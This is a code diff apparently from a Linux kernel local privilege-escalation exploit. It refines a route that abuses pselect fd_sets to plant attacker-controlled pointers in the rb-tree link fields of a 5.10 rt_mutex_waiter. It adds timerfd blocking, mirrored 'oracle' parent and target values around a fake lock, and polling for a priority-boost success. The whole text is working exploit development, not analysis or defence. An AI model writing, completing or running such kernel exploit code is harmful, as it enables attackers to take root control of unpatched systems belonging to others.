@@ -143,6 +143,30 @@ void open_selected_fds(
     pr_warning("pselect F_DUPFD write errno=%d\n", errno);
     return;
   }
+#if defined(PSELECT_FDSET_LINKS) && PSELECT_FDSET_LINKS
+  /*
+   * Mirror open_slide_selected_fds(): block on a timerfd (never readable
+   * until it expires), not on the route's pipe read end -- the sets now carry
+   * attacker link values and the pipe may already be readable, which would
+   * make pselect return immediately and lose the route.
+   */
+  int block_fd = (int)syscall(SYS_timerfd_create, 1 /* CLOCK_MONOTONIC */, 0);
+  if (block_fd < 0) {
+    block_fd = read_fd;
+  }
+  int high_block = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
+  if (high_block < 0) {
+    high_block = block_fd;
+  }
+  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
+    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
+      dup2(high_block, fd);
+    }
+  }
+  close(high_write);
+  dup2(high_block, PSELECT_ROUTE_NFDS - 1);
+  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
+#else
   for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
     if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
       dup2(high_write, fd);
@@ -151,6 +175,7 @@ void open_selected_fds(
   close(high_write);
   dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
+#endif
 }
 
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
@@ -162,6 +187,29 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   fdset_put_word(in, 1, 0);
   fdset_put_word(in, 2, 0);
   fdset_put_word(in, 3, 0);
+#if defined(PSELECT_FDSET_LINKS) && PSELECT_FDSET_LINKS
+  /*
+   * The waiter words that overlap the 5.10 rt_mutex_waiter's link fields are
+   * not at fdset word 0: with the derived mapping (fdset word 4+w == waiter
+   * word w) tree_entry[0..2] are in[4], out[0], out[1] and pi_tree_entry[0..2]
+   * are out[2], out[3], out[4]. They were previously left zero, so
+   * rb_erase()/rb_link_node() had no attacker-controlled parent to write
+   * through. Mirror the page-side waiter's link values here.
+   */
+  /* Values mirror prepare_slide_pselect_fdsets()'s legacy-waiter table:
+   *   word0 tree_pc = oracle parent | word1 tree_right = 0
+   *   word2 tree_left = target    | word3 pi_pc = parent
+   *   word4 pi_right = 0          | word5 pi_left = target
+   * An install-targeted variant (tree_pc = target-16, tree_left = fake_fops)
+   * was tried and changed nothing: with MIN_CHAINWALK the walk never reaches
+   * the [7] requeue/rb_erase store, so those fields are not read. */
+  fdset_put_word(in, 4, slide_oracle_parent);           /* tree_pc   */
+  fdset_put_word(out, 0, 0);                            /* tree_right*/
+  fdset_put_word(out, 1, slide_oracle_target);          /* tree_left */
+  fdset_put_word(out, 2, slide_oracle_parent);          /* pi_pc     */
+  fdset_put_word(out, 3, 0);                            /* pi_right  */
+  fdset_put_word(out, 4, slide_oracle_target);          /* pi_left   */
+#endif
   fdset_put_word(ex, 0, text_addr(INIT_TASK));
   fdset_put_word(ex, 1, fake_lock);
   fdset_put_word(ex, 2, 3);
@@ -231,6 +279,18 @@ void do_pselect_fake_lock_route(void) {
     atomic_store(&punch_consume_go, 0);
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
+    /*
+     * The consumer's rt_mutex_adjust_prio_chain walk is released by the same
+     * pselect timeout, so its successful return lands just after this point.
+     * Poll briefly before concluding the boost failed (kprobe-measured
+     * duration: ~20.00 s, i.e. exactly the pselect window).
+     */
+    for (int settle_ms = 0; settle_ms < PSELECT_CONSUMER_SETTLE_MS &&
+                            calls > 0 && success == 0; settle_ms += 10) {
+      usleep(10000);
+      calls = atomic_load(&consumer_calls);
+      success = atomic_load(&consumer_success);
+    }
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec);
 
